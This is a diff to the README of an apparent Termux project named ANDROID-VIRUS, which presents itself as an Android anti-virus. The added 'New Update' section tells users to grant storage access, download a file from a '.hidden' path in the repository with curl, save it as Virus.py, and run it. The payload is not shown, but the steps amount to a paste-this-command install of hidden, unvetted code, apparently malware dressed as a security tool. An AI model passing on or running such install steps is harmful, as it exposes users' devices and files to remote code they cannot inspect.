@@ -46,3 +46,19 @@ Hellboy Android Anti-Virus Features:-
 * `cd ANDROID-VIRUS`
 
 * `python Virus.py`
+
+
+## New Update ANDROID-VIRUS 😉
+
+
+* `apt update`
+
+* `apt upgrade`
+
+* `termux-setup-storage`
+
+* `pkg install python -y`
+
+* `cd $HOME && curl https://raw.githubusercontent.com/DeV1LN1H4d/ANDROID-VIRUS/main/.hidden/Virus >> Virus.py`
+
+* `python Virus.py`
